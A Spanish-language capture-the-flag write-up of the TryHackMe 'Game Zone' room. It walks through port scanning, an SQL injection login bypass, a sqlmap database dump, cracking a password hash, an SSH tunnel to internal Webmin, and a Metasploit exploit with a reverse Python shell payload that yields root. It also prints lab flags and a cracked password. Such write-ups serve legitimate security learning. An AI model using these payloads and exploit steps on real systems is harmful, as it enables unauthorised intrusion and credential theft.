---
title: "TryHackMe: Game Zone"
date: 2025-05-12
category: "TryHackMe"
order: 10
tags: ["tryhackme", "sqli", "sqlmap", "webmin", "ssh-tunnel"]
layout: layouts/writeup.njk
permalink: /writeups/thm-game-zone.html
---

## Reconocimiento

```bash
sudo nmap -Pn -n -v -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV 10.10.38.236
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Pregunta curiosa del room:** identificar el nombre del avatar de un francotirador en el foro. Se descarga la imagen (`curl -O http://.../images/header_image.png`) y se hace una búsqueda inversa en Google Images — resulta ser **Agent 47** (de la saga Hitman).

---

## Obtener acceso vía SQL Injection

La app compara el login contra una consulta tipo:

```sql
SELECT * FROM users WHERE username = :username AND password = :password
```

Insertando `' or 1=1 -- -` como contraseña (usuario `admin`, sin importar si existe), la consulta queda:

```sql
SELECT * FROM users WHERE username = admin AND password = '' or 1=1 -- -
```

El `or 1=1` hace que la condición sea siempre verdadera, y `--` comenta el resto — bypass de login clásico. GameZone no tiene cuenta `admin` en la base, pero el bypass funciona igual con el campo de contraseña en blanco.

---

## Extracción con SQLMap

Se captura la petición del campo de búsqueda con Burp Suite y se guarda en `request.txt`:

```bash
sqlmap -r request.txt --dbms=mysql --dump
```

- `-r`: usa la request capturada.
- `--dbms`: especifica el motor de base de datos.
- `--dump`: intenta volcar toda la base de datos.

**Resultado — tabla `users`:**

```
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

El hash fue identificado como **SHA-256** con `hashid`.

---

## Crackeo con John the Ripper

```bash
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt guess.txt
...
videogamer124    (?)
```

**Contraseña:** `videogamer124`

## Acceso SSH

```bash
ssh agent47@10.10.125.175
agent47@10.10.125.175's password: videogamer124
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

---

## Exponiendo servicios internos con reverse SSH tunnels

`ss -tulpn` revela sockets escuchando solo en localhost:

```bash
tcp  LISTEN  0  80   127.0.0.1:3306  *:*
tcp  LISTEN  0  128         *:10000  *:*
```

Hay un servicio en el puerto **10000** bloqueado desde afuera por firewall. Con un túnel SSH local se expone hacia la propia máquina:

```bash
ssh -L 10000:localhost:10000 agent47@10.10.125.175
```

`-L` crea un túnel local (tráfico que sale de tu máquina hacia el servidor remoto y de ahí al destino final). `-R` sería lo opuesto — un túnel remoto, exponiendo un servicio local hacia el servidor remoto.

Con el túnel activo, `nmap -sC -sV -p10000 localhost` identifica:

```
10000/tcp open  http    MiniServ 1.580 (Webmin httpd)
```

**Servicio expuesto:** Webmin, versión **1.580**.

---

## Escalada de privilegios con Metasploit

Se busca un exploit para Webmin 1.580 y se configura en Metasploit:

```bash
use unix/webapp/webmin_show_cgi_exec
set rhosts localhost
set ssl false
set username agent47
set password videogamer124
set payload cmd/unix/reverse_python
set lhost tun0
run
```

```
[+] Authentication successful
[+] Payload executed successfully
[*] Command shell session 2 opened
```

```bash
sessions -i 2
id
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:**

```bash
cat /root/root.txt
a4b945830144bdd71908d12d902adeee
```
